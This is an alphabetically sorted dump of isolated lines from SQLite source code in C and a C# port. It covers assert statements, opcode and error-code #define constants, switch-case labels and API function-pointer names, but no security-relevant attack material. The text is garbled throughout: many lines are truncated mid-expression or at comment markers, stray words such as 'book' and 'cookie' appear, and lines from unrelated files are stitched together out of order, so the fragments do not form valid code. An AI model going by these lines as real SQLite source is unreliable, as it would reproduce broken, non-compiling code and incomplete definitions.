assert( pExpr->iColumn<pTab->nCol )
assert( pExpr->iTable==pStack->newIdx 
assert( pExpr->op==TK_COLUMN )
assert( pLater->pNext==0 
assert( pLater->sharable )
assert( pMem->n>=0 )
assert( pModule.xRowid )
assert( pOut->flags 
assert( pOut->zMalloc==pOut->z )
assert( pParse )
assert( pTab->iPKey<pTab->nCol )
assert( ppStmt )
assert( sqlite3_mutex_held(db->mutex) )
assert( sqlite3_mutex_held(p->db->mutex) )
assert( sqlite3_mutex_held(p->pBt->mutex) )
assert( sqlite3_mutex_held(p.db.mutex) )
assert( sqlite3_mutex_held(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER)) )
assert( sqlite3_mutex_notheld(p->pBt->mutex) )
assert(SQLITE_IOCAP_ATOMIC512==(512>>8))
assert(SQLITE_IOCAP_ATOMIC64K==(65536>>8))
assertMutexHeld()
attach_end:
attach_error:
autoinc = pTab.iPKey==iCol 
azArg = (const char 
azModuleArg
azNew = new string[p.nAlloc]
b = (int
b = b << 14
b = b << 7
b AS x FROM table WHERE x<10
bInit = FALSE
bReturn = TRUE
b]){ a
begin_table_error:
bind_blob)(sqlite3_stmt
bind_double)(sqlite3_stmt
bind_int)(sqlite3_stmt
bind_int64)(sqlite3_stmt
bind_null)(sqlite3_stmt
bind_parameter_count)(sqlite3_stmt
bind_parameter_index)(sqlite3_stmt
bind_parameter_name)(sqlite3_stmt
bind_text)(sqlite3_stmt
bind_text16)(sqlite3_stmt
bind_value)(sqlite3_stmt
bind_zeroblob)(sqlite3_stmt
bindings] on the [prepared statement] S.
bitvec_end:
bitvec_set_end:
bitvec_set_rehash:
blob_bytes)(sqlite3_blob
blob_close)(sqlite3_blob
blob_open)(sqlite3
blob_read)(sqlite3_blob
blob_write)(sqlite3_blob
bom = SQLITE_UTF16BE
bom = SQLITE_UTF16LE
book
bool isMemdb = false
bool isView = false
bool removed = false
break
btreeInitPage(pTo)
buf[etBUFSIZE-1]-bufpt)
busy_handler)(sqlite3
busy_timeout)(sqlite3
byte[] b01 = new byte[2]
byte[] sBuf = BitConverter.GetBytes(System.DateTime.Now.Ticks)
c = sqlite3VdbeIntValue(pIn1)!=0
callback)(void
case OP_SetNumColumns:
case OP_TableLock:
case OP_VBegin: {
case OP_VColumn: {
case OP_VCreate: {
case OP_VDestroy: {
case OP_VFilter: {   /
case OP_VNext: {   /
case OP_VOpen: {
case OP_VRename: {
case OP_VUpdate: {
case P4_VTAB: {
case SQLITE_BLOB:
case SQLITE_CONFIG_GETMUTEX:
case SQLITE_CONFIG_GETMUTEX: {
case SQLITE_CONFIG_HEAP: {
case SQLITE_CONFIG_MULTITHREAD:
case SQLITE_CONFIG_MUTEX:
case SQLITE_CONFIG_MUTEX: {
case SQLITE_CONFIG_SERIALIZED:
case SQLITE_CONFIG_SINGLETHREAD:
case SQLITE_FLOAT:
case SQLITE_INTEGER:
case SQLITE_MUTEX_FAST:
case SQLITE_MUTEX_RECURSIVE: {
case SQLITE_NULL:
case SQLITE_TEXT:
case SRT_Exists: {
case TK_ROW: {
changes)(sqlite3
char 
char const 
char zBuf[100]
char zBuf[20]
char zKey[40]
char zResult[8]
char zStmtType              /
checkListProperties(0)
checkListProperties(db)
chrome
class TabResult {
clear_bindings)(sqlite3_stmt
close)(sqlite3
cnt )
cnt < MX_CLOSE_ATTEMPT )
cnt < MX_CLOSE_ATTEMPT) Thread.Sleep(100)
cnt < MX_DELETION_ATTEMPTS )
cnt < MX_DELETION_ATTEMPTS)
cnt bytes of memory to use for
cnt is incremented each time.  After counter exceeds
code = SQLITE_CREATE_TABLE
code = SQLITE_CREATE_TEMP_TABLE
code = SQLITE_CREATE_TEMP_VIEW
code = SQLITE_CREATE_VIEW
code = SQLITE_DROP_TABLE
code = SQLITE_DROP_TEMP_TABLE
code = SQLITE_DROP_TEMP_VIEW
code = SQLITE_DROP_VIEW
code = SQLITE_DROP_VTABLE
collation_needed)(sqlite3
collation_needed16)(sqlite3
column was found.  This can only occur
column_blob)(sqlite3_stmt
column_bytes)(sqlite3_stmt
column_bytes16)(sqlite3_stmt
column_count)(sqlite3_stmt
column_database_name)(sqlite3_stmt
column_database_name16)(sqlite3_stmt
column_decltype)(sqlite3_stmt
column_decltype16)(sqlite3_stmt
column_double)(sqlite3_stmt
column_int)(sqlite3_stmt
column_int64)(sqlite3_stmt
column_name)(sqlite3_stmt
column_name16)(sqlite3_stmt
column_origin_name)(sqlite3_stmt
column_origin_name16)(sqlite3_stmt
column_table_name)(sqlite3_stmt
column_table_name16)(sqlite3_stmt
column_text)(sqlite3_stmt
column_text16)(sqlite3_stmt
column_type)(sqlite3_stmt
column_value)(sqlite3_stmt
commit_hook)(sqlite3
commit_phase_one_exit:
complete)(const char
complete16)(const void
const
const Pgno iLastPg = Pgno.MaxValue
const Trigger pTrigger = null
const bool isView = false
const char 
const int 
const int COLNAME_N = 1
const int COLNAME_N = 5
const int MAX_ROWID = i32.MaxValue
const int NDEBUG = 1
const int SQLITE_CORRUPT_BKPT = SQLITE_CORRUPT
const int SQLITE_DEFAULT_PAGE_SIZE SQLITE_MAX_PAGE_SIZE
const int SQLITE_MAX_DEFAULT_PAGE_SIZE SQLITE_MAX_PAGE_SIZE
const int SQLITE_PRINT_BUF_SIZE = 50
const int SQLITE_THREADSAFE = 1
const int _FILE_OFFSET_BITS = 64
const int _LARGEFILE_SOURCE = 1
const int _LARGE_FILE = 1
const int _XOPEN_SOURCE = 500
const sqlite3_api_routines sqlite3Apis = null
const sqlite3_index_constraint
const sqlite3_mem_methods 
const sqlite3_module 
const sqlite3_module pModule
const sqlite3_module pModule = pCx.pModule
const string zOrigCol = 0
const string zOrigDb = 0
const string zOrigTab = 0
const u8 
const void 
context_db_handle)(sqlite3_context
cookie
create_collation)(sqlite3
create_collation16)(sqlite3
create_collation_v2)(sqlite3
create_function)(sqlite3
create_function16)(sqlite3
create_module)(sqlite3
create_module_v2)(sqlite3
ct.fetchId=fetchId
ct.lru=lru
ct.pLruNext=pLruNext
ct.pLruPrev=pLruPrev
d AS y FROM t1 ORDER BY a
d AS y FROM t1 ORDER BY x
data and pParent holds only keys.
data being inserted 
data[cellOffset 
data[j]
data[pPage.cellOffset 
data_count)(sqlite3_stmt
db != null 
db = pParse->db
db = pVTab->db
db = sqlite3_context_db_handle(context)
db){
db->mallocFailed = 0
db->pAuthArg = pArg
db->pBlockingConnection = pBlocker
db->pNextBlocked = 
db->pUnlockArg = 0
db->pUnlockArg = pArg
db->pUnlockConnection = 0
db->pUnlockConnection = db->pBlockingConnection
db->xAuth = xAuth
db->xUnlockNotify = 0
db->xUnlockNotify = xNotify
db.aDb[iDb].pSchema.idxHash)
db.aDb[iDb].zName ) ){
db.aDb[idx].pSchema.tblHash)
db.aModule)
db.dfltLockMode = SQLITE_DEFAULT_LOCKING_MODE
db.errCode = SQLITE_NOMEM
db.errCode = res.rc
db.lastRowid = rowid
db.lookaside.mxOut = db.lookaside.nOut
db.lookaside.nOut
db.lookaside.pFree = pBuf.pNext
db.mallocFailed = 0
db.mallocFailed = 1
db.nExtension
db.xAuth = 0
db.xAuth = xAuth
db2 = pVTable->db
dbFileVers = 
db_handle)(sqlite3_stmt
dc = sqlite3OsDeviceCharacteristics(pPager.fd)
debugMutexAlloc(int id){
debugMutexNotheld
declareVtab = 0
declareVtab = SaveBuf[nested].declareVtab
declare_vtab)(sqlite3
def AS 'db2'
default: {
defaultMethods)
define //sqlite3_free                   sqlite3_api->free
define //sqlite3_free_table             sqlite3_api->free_table
define ADDR(X)  (-1-(X))
define ArraySize(X)    ((int)(sizeof(X)/sizeof(X[0])))
define BITVEC_HASH(X)   (((X)
define BITVEC_MXHASH    (BITVEC_NINT/2)
define BITVEC_NBIT      (BITVEC_NELEM
define BITVEC_NELEM     (BITVEC_USIZE/sizeof(BITVEC_TELEM))
define BITVEC_NINT      (BITVEC_USIZE/sizeof(u32))
define BITVEC_SZELEM    8
define BITVEC_TELEM     u8
define BITVEC_USIZE     (((BITVEC_SZ-(3
define BMS  ((int)(sizeof(Bitmask)
define BTCURSOR_MAX_DEPTH 20
define BTREE_DEFAULT_CACHE_SIZE  3
define BTREE_FILE_FORMAT         2
define BTREE_FREE_PAGE_COUNT     0
define BTREE_INCR_VACUUM         7
define BTREE_LARGEST_ROOT_PAGE   4
define BTREE_SCHEMA_VERSION      1
define BTREE_TEXT_ENCODING       5
define BTREE_USER_VERSION        6
define CHECK_FOR_INTERRUPT 
define CHECK_PAGE(x)
define CHECK_PAGE(x) checkPage(x)
define COLNAME_COLUMN   4
define COLNAME_DATABASE 2
define COLNAME_DECLTYPE 1
define COLNAME_NAME     0
define COLNAME_TABLE    3
define DB_Empty           0x0004  /
define DB_SchemaLoaded    0x0001  /
define DB_UnresetViews    0x0002  /
define DO_OS_MALLOC_TEST(x)
define DO_OS_MALLOC_TEST(x) if (!x 
define Deephemeralize(P) 
define EIGHT_BYTE_ALIGNMENT(X)   ((((char
define ENC(db) ((db)->aDb[0].pSchema->enc)
define EP2_Irreducible    0x0002  /
define EP2_MallocedToken  0x0001  /
define EP_Agg        0x0002  /
define EP_AnyAff     0x0200  /
define EP_DblQuoted  0x0040  /
define EP_Distinct   0x0010  /
define EP_Error      0x0008  /
define EP_ExpCollate 0x0100  /
define EP_FixedDest  0x0400  /
define EP_FromJoin   0x0001  /
define EP_InfixFunc  0x0080  /
define EP_IntValue   0x0800  /
define EP_Reduced    0x2000  /
define EP_Resolved   0x0004  /
define EP_Static     0x8000  /
define EP_TokenOnly  0x4000  /
define EP_VarSelect  0x0020  /
define EP_xIsSelect  0x1000  /
define EXPRDUP_REDUCE         0x0001  /
define EXPR_FULLSIZE           sizeof(Expr)           /
define ExpandBlob(P) (((P).flags
define FILEHANDLEID(fd) ((int)fd)
define HANDLE_TO_WINFILE(a) (sqlite3_file
define HAVE_LOCALTIME_S
define IN_DECLARE_VTAB (pParse.declareVtab)
define IN_DECLARE_VTAB 0
define IN_INDEX_EPH             2
define IN_INDEX_INDEX           3
define IN_INDEX_ROWID           1
define IOTRACE(A)
define IOTRACE(A)  if( sqlite3IoTrace ){ sqlite3IoTrace A
define ISAUTOVACUUM (pBt.autoVacuum)
define ISAUTOVACUUM 0
define IdChar(C)  (((c=C)
define IdChar(C)  (((c=C)>=0x42 
define IgnorableOrderby(X) ((X->eDest)<=SRT_Discard)
define JOURNAL_CHUNKSIZE ((int)(1024-sizeof(FileChunk
define JOURNAL_HDR_SZ(pPager) (pPager.sectorSize)
define JOURNAL_PG_SZ(pPager)  ((pPager.pageSize) 
define JT_CROSS     0x0002    /
define JT_ERROR     0x0040    /
define JT_INNER     0x0001    /
define JT_LEFT      0x0008    /
define JT_NATURAL   0x0004    /
define JT_OUTER     0x0020    /
define JT_RIGHT     0x0010    /
define LARGEST_INT64  (0xffffffff
define MASTER_ROOT       1
define MAX_SECTOR_SIZE 0x10000
define MEMCELLSIZE (size_t)(
define MEM_Agg       0x2000   /
define MEM_Blob      0x0010   /
define MEM_Dyn       0x0400   /
define MEM_Ephem     0x1000   /
define MEM_Int       0x0004   /
define MEM_Null      0x0001   /
define MEM_Real      0x0008   /
define MEM_RowSet    0x0020   /
define MEM_Static    0x0800   /
define MEM_Str       0x0002   /
define MEM_Term      0x0200   /
define MEM_TypeMask  0x00ff   /
define MEM_Zero      0x4000   /
define MEM_Zero 0x0000
define MX_CELL(pBt) ((pBt.pageSize-8)/6)
define MX_CELL_SIZE(pBt)  (pBt.pageSize-8)
define N_SORT_BUCKET  32
define OE_Abort    2   /
define OE_Cascade  9   /
define OE_Default  99  /
define OE_Fail     3   /
define OE_Ignore   4   /
define OE_None     0   /
define OE_Replace  5   /
define OE_Restrict 6   /
define OE_Rollback 1   /
define OE_SetDflt  8   /
define OE_SetNull  7   /
define OMIT_TEMPDB 1
define OPFLAG_APPEND    8    /
define OPFLAG_ISUPDATE  4    /
define OPFLAG_LASTROWID 2    /
define OPFLAG_NCHANGE   1    /
define OPFLAG_USESEEKRESULT 16    /
define OPFLG_IN1             0x0004  /
define OPFLG_IN2             0x0008  /
define OPFLG_IN3             0x0010  /
define OPFLG_JUMP            0x0001  /
define OPFLG_OUT2_PRERELEASE 0x0002  /
define OPFLG_OUT3            0x0020  /
define OP_Add                                 84   /
define OP_AddImm                              42
define OP_Affinity                             2
define OP_AggFinal                            92
define OP_AggStep                            100
define OP_And                                 67   /
define OP_AutoCommit                          15
define OP_BitAnd                              80   /
define OP_BitNot                              93   /
define OP_BitOr                               81   /
define OP_Blob                               121
define OP_Clear                               98
define OP_Close                               33
define OP_CollSeq                             12
define OP_Column                               3
define OP_Compare                             95
define OP_Concat                              89   /
define OP_ContextPop                         105
define OP_ContextPush                         59
define OP_Copy                                20
define OP_Count                              107
define OP_CreateIndex                         34
define OP_CreateTable                         53
define OP_Delete                              91
define OP_Destroy                            111
define OP_Divide                              87   /
define OP_DropIndex                           62
define OP_DropTable                           69
define OP_DropTrigger                         61
define OP_Eq                                  74   /
define OP_Expire                              14
define OP_Explain                            115
define OP_Found                              128
define OP_Function                            22
define OP_Ge                                  78   /
define OP_Gosub                               47
define OP_Goto                                96
define OP_Gt                                  75   /
define OP_Halt                                39
define OP_HaltIfNull                         116
define OP_IdxDelete                           64
define OP_IdxGE                               63
define OP_IdxInsert                          108
define OP_IdxLT                               41
define OP_IdxRowid                            57
define OP_If                                  11
define OP_IfNeg                               23
define OP_IfNot                               68
define OP_IfPos                              129
define OP_IfZero                             126
define OP_IncrVacuum                          56
define OP_Insert                             110
define OP_Int64                               37
define OP_Integer                             48
define OP_IntegrityCk                         17
define OP_IsNull                              71   /
define OP_IsUnique                            35
define OP_Jump                               132
define OP_Last                                54
define OP_Le                                  76   /
define OP_LoadAnalysis                       114
define OP_Lt                                  77   /
define OP_MakeRecord                          79
define OP_MemMax                              45
define OP_Move                               120
define OP_Multiply                            86   /
define OP_MustBeInt                           38
define OP_Ne                                  73   /
define OP_NewRowid                            26
define OP_Next                               106
define OP_Noop                                24
define OP_Not                                 19   /
define OP_NotExists                           46
define OP_NotFound                            36
define OP_NotNull                             72   /
define OP_NotUsed_134                        134
define OP_NotUsed_135                        135
define OP_NotUsed_136                        136
define OP_NotUsed_137                        137
define OP_NotUsed_138                        138
define OP_NotUsed_139                        139
define OP_NotUsed_140                        140
define OP_Null                               119
define OP_NullRow                            131
define OP_OpenEphemeral                      118
define OP_OpenPseudo                         117
define OP_OpenRead                            13
define OP_OpenWrite                           10
define OP_Or                                  66   /
define OP_Pagecount                           16
define OP_ParseSchema                         31
define OP_Permutation                        133
define OP_Prev                                49
define OP_ReadCookie                         112
define OP_Real                               130   /
define OP_RealAffinity                        29
define OP_Remainder                           88   /
define OP_ResetCount                          58
define OP_ResultRow                           90
define OP_Return                              25
define OP_Rewind                             122
define OP_RowData                             44
define OP_RowKey                               8
define OP_RowSetAdd                           51
define OP_RowSetRead                          50
define OP_RowSetTest                         113
define OP_Rowid                               40
define OP_SCopy                                9
define OP_Savepoint                            7
define OP_Seek                                 5
define OP_SeekGe                             109
define OP_SeekGt                             123
define OP_SeekLe                              55
define OP_SeekLt                              70
define OP_Sequence                             6
define OP_SetCookie                            4
define OP_SetNumColumns                      101
define OP_ShiftLeft                           82   /
define OP_ShiftRight                          83   /
define OP_Sort                                18
define OP_Statement                           43
define OP_String                              28
define OP_String8                             94   /
define OP_Subtract                            85   /
define OP_TableLock                           97
define OP_ToBlob                             142   /
define OP_ToInt                              144   /
define OP_ToNumeric                          143   /
define OP_ToReal                             145   /
define OP_ToText                             141   /
define OP_Trace                               21
define OP_Transaction                        102
define OP_VBegin                             124
define OP_VColumn                             52
define OP_VCreate                            127
define OP_VDestroy                           104
define OP_VFilter                            103
define OP_VNext                                1
define OP_VOpen                               32
define OP_VRename                             30
define OP_VUpdate                            125
define OP_Vacuum                              65
define OP_Variable                            27
define OP_VerifyCookie                        99
define OP_Yield                               60
define OSTRACE1(X)
define OpenCounter(X)
define P4_INTARRAY (-15) /
define P4_KEYINFO_HANDOFF (-16)
define P4_KEYINFO_STATIC  (-17)
define PAGERID(p) ((int)(p.fd))
define PAGERTRACE(X)
define PAGERTRACE(X)     if( sqlite3PagerTrace ){ sqlite3DebugPrintf X
define PAGER_JOURNALMODE_DELETE      0   /
define PAGER_JOURNALMODE_MEMORY      4   /
define PAGER_JOURNALMODE_OFF         2   /
define PAGER_JOURNALMODE_PERSIST     1   /
define PAGER_JOURNALMODE_QUERY      -1
define PAGER_JOURNALMODE_TRUNCATE    3   /
define PAGER_LOCKINGMODE_EXCLUSIVE   1
define PAGER_LOCKINGMODE_NORMAL      0
define PAGER_LOCKINGMODE_QUERY      -1
define PAGER_MAX_PGNO 2147483647
define PAGER_MJ_PGNO(x) ((Pgno)((PENDING_BYTE/((x)->pageSize))
define PAGER_NO_READLOCK   0x0002    /
define PAGER_OMIT_JOURNAL  0x0001    /
define PGHDR1_TO_PAGE(p)    (void
define PGHDR_DIRTY             0x002  /
define PGHDR_DONT_WRITE        0x020  /
define PGHDR_NEED_READ         0x008  /
define PGHDR_NEED_SYNC         0x004  /
define PGHDR_REUSE_UNLIKELY    0x010  /
define PTRMAP_BTREE 5
define PTRMAP_FREEPAGE 2
define PTRMAP_OVERFLOW1 3
define PTRMAP_OVERFLOW2 4
define PTRMAP_ROOTPAGE 1
define READ_LOCK     1
define ROUND8(x)     (((x)
define ROUNDDOWN8(x) ((x)
define ROWSET_ALLOCATION_SIZE 1024
define ROWSET_ENTRY_PER_CHUNK  
define SAVEPOINT_BEGIN      0
define SAVEPOINT_RELEASE    1
define SAVEPOINT_ROLLBACK   2
define SCHEMA_TABLE(x)  ((!OMIT_TEMPDB)
define SF_Aggregate       0x0004  /
define SF_Distinct        0x0001  /
define SF_Expanded        0x0010  /
define SF_HasTypeInfo     0x0020  /
define SF_Resolved        0x0002  /
define SF_UsesEphemeral   0x0008  /
define SMALLEST_INT64 (((i64)-1) - LARGEST_INT64)
define SQLITE3_TEXT     3
define SQLITE_ABORT        4   /
define SQLITE_ACCESS_EXISTS    0
define SQLITE_ACCESS_READ      2
define SQLITE_ACCESS_READWRITE 1
define SQLITE_AFF_INTEGER  'd'
define SQLITE_AFF_MASK     0x67
define SQLITE_AFF_NONE     'b'
define SQLITE_AFF_NUMERIC  'c'
define SQLITE_AFF_REAL     'e'
define SQLITE_AFF_TEXT     'a'
define SQLITE_ALTER_TABLE          26   /
define SQLITE_ANALYZE              28   /
define SQLITE_ANY            5    /
define SQLITE_ASCII 1
define SQLITE_ATTACH               24   /
define SQLITE_AUTH        23   /
define SQLITE_BIGENDIAN    (
define SQLITE_BIGENDIAN    0
define SQLITE_BLOB     4
define SQLITE_BUSY         5   /
define SQLITE_CANTOPEN    14   /
define SQLITE_COLL_BINARY  1  /
define SQLITE_COLL_NOCASE  2  /
define SQLITE_COLL_REVERSE 3  /
define SQLITE_COLL_USER    0  /
define SQLITE_CONFIG_GETMALLOC     5  /
define SQLITE_CONFIG_GETMUTEX     11  /
define SQLITE_CONFIG_GETPCACHE    15  /
define SQLITE_CONFIG_HEAP          8  /
define SQLITE_CONFIG_LOOKASIDE    13  /
define SQLITE_CONFIG_MALLOC        4  /
define SQLITE_CONFIG_MEMSTATUS     9  /
define SQLITE_CONFIG_MULTITHREAD   2  /
define SQLITE_CONFIG_MUTEX        10  /
define SQLITE_CONFIG_PAGECACHE     7  /
define SQLITE_CONFIG_PCACHE       14  /
define SQLITE_CONFIG_SCRATCH       6  /
define SQLITE_CONFIG_SERIALIZED    3  /
define SQLITE_CONFIG_SINGLETHREAD  1  /
define SQLITE_CONSTRAINT  19   /
define SQLITE_COPY                  0   /
define SQLITE_CORE 1  /
define SQLITE_CORRUPT     11   /
define SQLITE_CORRUPT_BKPT SQLITE_CORRUPT
define SQLITE_CREATE_INDEX          1   /
define SQLITE_CREATE_TABLE          2   /
define SQLITE_CREATE_TEMP_INDEX     3   /
define SQLITE_CREATE_TEMP_TABLE     4   /
define SQLITE_CREATE_TEMP_TRIGGER   5   /
define SQLITE_CREATE_TEMP_VIEW      6   /
define SQLITE_CREATE_TRIGGER        7   /
define SQLITE_CREATE_VIEW           8   /
define SQLITE_CREATE_VTABLE        29   /
define SQLITE_CountRows      0x00000080  /
define SQLITE_DBCONFIG_LOOKASIDE    1001  /
define SQLITE_DBSTATUS_LOOKASIDE_USED     0
define SQLITE_DEFAULT_JOURNAL_SIZE_LIMIT -1
define SQLITE_DELETE                9   /
define SQLITE_DENY   1   /
define SQLITE_DEPRECATED
define SQLITE_DETACH               25   /
define SQLITE_DONE        101  /
define SQLITE_DROP_INDEX           10   /
define SQLITE_DROP_TABLE           11   /
define SQLITE_DROP_TEMP_INDEX      12   /
define SQLITE_DROP_TEMP_TABLE      13   /
define SQLITE_DROP_TEMP_TRIGGER    14   /
define SQLITE_DROP_TEMP_VIEW       15   /
define SQLITE_DROP_TRIGGER         16   /
define SQLITE_DROP_VIEW            17   /
define SQLITE_DROP_VTABLE          30   /
define SQLITE_DYNAMIC   ((sqlite3_destructor_type)//sqlite3DbFree)
define SQLITE_EMPTY       16   /
define SQLITE_ERROR        1   /
define SQLITE_EXPERIMENTAL
define SQLITE_EXTENSION_INIT1     const sqlite3_api_routines 
define SQLITE_EXTENSION_INIT2(v)  sqlite3_api = v
define SQLITE_FAULTINJECTOR_COUNT      1
define SQLITE_FAULTINJECTOR_MALLOC     0
define SQLITE_FCNTL_DB_UNCHANGED 0xca093fa0
define SQLITE_FCNTL_LOCKSTATE        1
define SQLITE_FLOAT    2
define SQLITE_FORMAT      24   /
define SQLITE_FULL        13   /
define SQLITE_FUNCTION             31   /
define SQLITE_FUNC_CASE     0x02  /
define SQLITE_FUNC_COUNT    0x20 /
define SQLITE_FUNC_EPHEM    0x04  /
define SQLITE_FUNC_LIKE     0x01  /
define SQLITE_FUNC_NEEDCOLL 0x08 /
define SQLITE_FUNC_PRIVATE  0x10 /
define SQLITE_FullColNames   0x00000020  /
define SQLITE_FullFSync      0x00010000  /
define SQLITE_GET_LOCKPROXYFILE      2
define SQLITE_IGNORE 2   /
define SQLITE_INDEX_CONSTRAINT_EQ    2
define SQLITE_INDEX_CONSTRAINT_GE    32
define SQLITE_INDEX_CONSTRAINT_GT    4
define SQLITE_INDEX_CONSTRAINT_LE    8
define SQLITE_INDEX_CONSTRAINT_LT    16
define SQLITE_INDEX_CONSTRAINT_MATCH 64
define SQLITE_INSERT               18   /
define SQLITE_INTEGER  1
define SQLITE_INTERNAL     2   /
define SQLITE_INTERRUPT    9   /
define SQLITE_IOCAP_ATOMIC          0x00000001
define SQLITE_IOCAP_ATOMIC16K       0x00000040
define SQLITE_IOCAP_ATOMIC1K        0x00000004
define SQLITE_IOCAP_ATOMIC2K        0x00000008
define SQLITE_IOCAP_ATOMIC32K       0x00000080
define SQLITE_IOCAP_ATOMIC4K        0x00000010
define SQLITE_IOCAP_ATOMIC512       0x00000002
define SQLITE_IOCAP_ATOMIC64K       0x00000100
define SQLITE_IOCAP_ATOMIC8K        0x00000020
define SQLITE_IOCAP_SAFE_APPEND     0x00000200
define SQLITE_IOCAP_SEQUENTIAL      0x00000400
define SQLITE_IOERR       10   /
define SQLITE_IOERR_ACCESS            (SQLITE_IOERR 
define SQLITE_IOERR_BLOCKED           (SQLITE_IOERR 
define SQLITE_IOERR_CHECKRESERVEDLOCK (SQLITE_IOERR 
define SQLITE_IOERR_CLOSE             (SQLITE_IOERR 
define SQLITE_IOERR_DELETE            (SQLITE_IOERR 
define SQLITE_IOERR_DIR_CLOSE         (SQLITE_IOERR 
define SQLITE_IOERR_DIR_FSYNC         (SQLITE_IOERR 
define SQLITE_IOERR_FSTAT             (SQLITE_IOERR 
define SQLITE_IOERR_FSYNC             (SQLITE_IOERR 
define SQLITE_IOERR_LOCK              (SQLITE_IOERR 
define SQLITE_IOERR_NOMEM             (SQLITE_IOERR 
define SQLITE_IOERR_RDLOCK            (SQLITE_IOERR 
define SQLITE_IOERR_READ              (SQLITE_IOERR 
define SQLITE_IOERR_SHORT_READ        (SQLITE_IOERR 
define SQLITE_IOERR_TRUNCATE          (SQLITE_IOERR 
define SQLITE_IOERR_UNLOCK            (SQLITE_IOERR 
define SQLITE_IOERR_WRITE             (SQLITE_IOERR 
define SQLITE_IgnoreChecks   0x00002000  /
define SQLITE_InTrans        0x00000008  /
define SQLITE_InternChanges  0x00000010  /
define SQLITE_JUMPIFNULL   0x08  /
define SQLITE_LAST_ERRNO             4
define SQLITE_LIMIT_ATTACHED                  7
define SQLITE_LIMIT_COLUMN                    2
define SQLITE_LIMIT_COMPOUND_SELECT           4
define SQLITE_LIMIT_EXPR_DEPTH                3
define SQLITE_LIMIT_FUNCTION_ARG              6
define SQLITE_LIMIT_LENGTH                    0
define SQLITE_LIMIT_LIKE_PATTERN_LENGTH       8
define SQLITE_LIMIT_SQL_LENGTH                1
define SQLITE_LIMIT_VARIABLE_NUMBER           9
define SQLITE_LIMIT_VDBE_OP                   5
define SQLITE_LITTLEENDIAN (
define SQLITE_LITTLEENDIAN 1
define SQLITE_LOCKED       6   /
define SQLITE_LOCKED_SHAREDCACHE      (SQLITE_LOCKED 
define SQLITE_LOCK_EXCLUSIVE     4
define SQLITE_LOCK_NONE          0
define SQLITE_LOCK_PENDING       3
define SQLITE_LOCK_RESERVED      2
define SQLITE_LOCK_SHARED        1
define SQLITE_LegacyFileFmt  0x00008000  /
define SQLITE_LoadExtension  0x00020000  /
define SQLITE_MAGIC_BUSY     0xf03b7906  /
define SQLITE_MAGIC_CLOSED   0x9f3c2d33  /
define SQLITE_MAGIC_ERROR    0xb5357930  /
define SQLITE_MAGIC_OPEN     0xa029a697  /
define SQLITE_MAGIC_SICK     0x4b771290  /
define SQLITE_MAX_EXPR_DEPTH
define SQLITE_MAX_FILE_FORMAT 4
define SQLITE_MAX_U32  ((((u64)1)<<32)-1)
define SQLITE_MISMATCH    20   /
define SQLITE_MISUSE      21   /
define SQLITE_MUTEX_FAST             0
define SQLITE_MUTEX_RECURSIVE        1
define SQLITE_MUTEX_STATIC_LRU       6  /
define SQLITE_MUTEX_STATIC_LRU2      7  /
define SQLITE_MUTEX_STATIC_MASTER    2
define SQLITE_MUTEX_STATIC_MEM       3  /
define SQLITE_MUTEX_STATIC_MEM2      4  /
define SQLITE_MUTEX_STATIC_OPEN      4  /
define SQLITE_MUTEX_STATIC_PRNG      5  /
define SQLITE_NOLFS       22   /
define SQLITE_NOMEM        7   /
define SQLITE_NOTADB      26   /
define SQLITE_NOTFOUND    12   /
define SQLITE_NULL     5
define SQLITE_N_LIMIT (SQLITE_LIMIT_VARIABLE_NUMBER
define SQLITE_NoReadlock     0x00001000  /
define SQLITE_NullCallback   0x00000100  /
define SQLITE_OK           0   /
define SQLITE_OPEN_CREATE           0x00000004  /
define SQLITE_OPEN_DELETEONCLOSE    0x00000008  /
define SQLITE_OPEN_EXCLUSIVE        0x00000010  /
define SQLITE_OPEN_FULLMUTEX        0x00010000  /
define SQLITE_OPEN_MAIN_DB          0x00000100  /
define SQLITE_OPEN_MAIN_JOURNAL     0x00000800  /
define SQLITE_OPEN_MASTER_JOURNAL   0x00004000  /
define SQLITE_OPEN_NOMUTEX          0x00008000  /
define SQLITE_OPEN_READONLY         0x00000001  /
define SQLITE_OPEN_READWRITE        0x00000002  /
define SQLITE_OPEN_SUBJOURNAL       0x00002000  /
define SQLITE_OPEN_TEMP_DB          0x00000200  /
define SQLITE_OPEN_TEMP_JOURNAL     0x00001000  /
define SQLITE_OPEN_TRANSIENT_DB     0x00000400  /
define SQLITE_OS_WIN
define SQLITE_PERM         3   /
define SQLITE_PRAGMA               19   /
define SQLITE_PROTOCOL    15   /
define SQLITE_RANGE       25   /
define SQLITE_READ                 20   /
define SQLITE_READONLY     8   /
define SQLITE_REINDEX              27   /
define SQLITE_ROW         100  /
define SQLITE_ReadUncommitted 0x00004000 /
define SQLITE_RecoveryMode   0x00040000  /
define SQLITE_ReverseOrder   0x00100000  /
define SQLITE_SAVEPOINT            32   /
define SQLITE_SCHEMA      17   /
define SQLITE_SELECT               21   /
define SQLITE_SET_LOCKPROXYFILE      3
define SQLITE_SKIP_UTF8(zIn) {                        
define SQLITE_SO_ASC       0  /
define SQLITE_SO_DESC     1  /
define SQLITE_STATIC      ((sqlite3_destructor_type)0)
define SQLITE_STATUS_MALLOC_SIZE          5
define SQLITE_STATUS_MEMORY_USED          0
define SQLITE_STATUS_PAGECACHE_OVERFLOW   2
define SQLITE_STATUS_PAGECACHE_SIZE       7
define SQLITE_STATUS_PAGECACHE_USED       1
define SQLITE_STATUS_PARSER_STACK         6
define SQLITE_STATUS_SCRATCH_OVERFLOW     4
define SQLITE_STATUS_SCRATCH_SIZE         8
define SQLITE_STATUS_SCRATCH_USED         3
define SQLITE_STMTSTATUS_FULLSCAN_STEP     1
define SQLITE_STMTSTATUS_SORT              2
define SQLITE_STOREP2      0x10  /
define SQLITE_SYNC_DATAONLY      0x00010
define SQLITE_SYNC_FULL          0x00003
define SQLITE_SYNC_NORMAL        0x00002
define SQLITE_ShortColNames  0x00000040  /
define SQLITE_SqlTrace       0x00000200  /
define SQLITE_TEMP_STORE 1
define SQLITE_TESTCTRL_ALWAYS                  13
define SQLITE_TESTCTRL_ASSERT                  12
define SQLITE_TESTCTRL_BENIGN_MALLOC_HOOKS     10
define SQLITE_TESTCTRL_BITVEC_TEST              8
define SQLITE_TESTCTRL_FAULT_INSTALL            9
define SQLITE_TESTCTRL_PENDING_BYTE            11
define SQLITE_TESTCTRL_PRNG_RESET               7
define SQLITE_TESTCTRL_PRNG_RESTORE             6
define SQLITE_TESTCTRL_PRNG_SAVE                5
define SQLITE_TESTCTRL_RESERVE                 14
